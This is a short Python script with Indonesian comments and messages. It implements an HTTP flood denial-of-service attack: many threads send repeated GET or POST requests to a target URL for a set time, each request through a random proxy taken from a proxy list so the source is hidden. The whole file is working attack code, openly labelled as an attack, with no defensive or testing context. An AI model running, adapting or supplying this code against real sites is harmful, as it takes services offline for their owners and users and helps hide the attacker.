import threading, requests, time, random
from proxy import load_proxies

def attack(target, proxy, method):
    try:
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}',
        }
        
        if method == 'POST':
            data = {'key': 'value'}  # Ganti sesuai data POST yang diinginkan
            response = requests.post(target, proxies=proxies, data=data, timeout=5)
        else:
            response = requests.get(target, proxies=proxies, timeout=5)
        
        # Print status untuk melihat apakah serangan berhasil
        print(f"Serangan ke {target} menggunakan proxy {proxy} berhasil dengan status: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Error dengan proxy {proxy}: {e}")
        pass

def start_attack(target, method, num_threads, duration):
    proxies = load_proxies()
    
    if not proxies:
        print("[!] Tidak ada proxy yang ditemukan. Pastikan file proxies.txt ada dan valid.")
        return

    stop_time = time.time() + duration
    print(f"Menyerang {target} selama {duration} detik dengan metode {method}...\n")

    def worker():
        while time.time() < stop_time:
            proxy = random.choice(proxies)
            attack(target, proxy, method)

    threads = [threading.Thread(target=worker) for _ in range(num_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print("\nSelesai mengirim serangan.")